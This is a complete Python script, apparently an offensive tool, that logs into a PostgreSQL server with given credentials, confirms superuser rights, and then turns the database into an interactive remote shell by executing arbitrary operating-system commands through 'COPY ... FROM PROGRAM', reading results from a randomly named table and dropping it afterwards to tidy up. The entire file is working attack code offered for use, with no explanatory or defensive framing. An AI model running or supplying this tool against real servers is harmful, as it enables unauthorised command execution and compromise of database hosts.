#!/usr/bin/env python3

import argparse
import random
import psycopg2 as pg

rand_str = lambda x: ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=x))

class PGShell(object):

    def __init__(self, **kwargs):
        self.host       = kwargs['host']
        self.port       = kwargs['port']
        self.user       = kwargs['user']
        self.password   = kwargs['pass']
        self.dbname     = kwargs['dbname']

        self.tablename  = rand_str(random.randint(8, 15))
        self.columnname = rand_str(random.randint(2, 5))

        self.conn = None

        if not self.connect():
            exit()


    def connect(self):
        print(f"[*] Connecting to {self.host}:{self.port}... (db: {self.dbname}, user: {self.user})")
        try:
            self.conn = pg.connect(f"host={self.host} port={self.port} user={self.user} password={self.password} dbname={self.dbname}")
            print("[!] Connected!")
            print(f"[*] We will use table {self.tablename} and column {self.columnname} to leverage RCE...")
            return True
        except:
            print("[x] Connection error!")
            return False

    def do_query(self, query):
        cur = self.conn.cursor()
        cur.execute(query)
        try:
            return [x[0] for x in cur.fetchall()]
        except:
            return None

    def init_recon(self):
        user = self.do_query("select current_user")[0]
        print(f"[*] Connected as user {user}")
        self.su = self.do_query(f"select usesuper from pg_catalog.pg_user where usename='{user}'")[0]
        if self.su:
            print(f"[!] Sweet! {user} is superuser!")
            return True
        else:
            print(f"[x] Unable to leverage RCE... {user} is not a superuser")
            return False


    def rce(self, command):
        self.do_query(f"drop table if exists {self.tablename}")
        self.do_query(f"create table {self.tablename}({self.columnname} TEXT)")
        self.do_query(f"COPY {self.tablename} from program '{command}'")
        data = self.do_query(f"select {self.columnname} from {self.tablename}")
        self.do_query(f"drop table {self.tablename}")
        return data

    def clean(self):
        print("\n[*] Cleaning database...")
        self.do_query("rollback")
        self.do_query(f"drop table if exists {self.tablename}")

def get_args():
    p = argparse.ArgumentParser()
    p.add_argument("-H", "--host",help="Hostname or IP", default="localhost")
    p.add_argument("-p", "--port",help="Port of the service", default="5432")
    p.add_argument("-d", "--dbname",help="database to connect", default="postgres")
    p.add_argument("-U", "--user",help="Username to connect with", required=True)
    p.add_argument("-P", "--pass",help="Password to use", required=True)

    return vars(p.parse_args())

def main():
    args = get_args()
    pgshell = PGShell(**(args))
    if not pgshell.init_recon():
        return

    try:
        while True:
            user_input = input(f"{pgshell.user}>> ")
            try:
                for line in pgshell.rce(user_input):
                    print(line)
                print("-"*50)
            except Exception as e:
                print(f"[x] Error: {e}")
                pgshell.clean()
    except KeyboardInterrupt:
        pgshell.clean()
        return

if __name__=='__main__':
    exit(main())
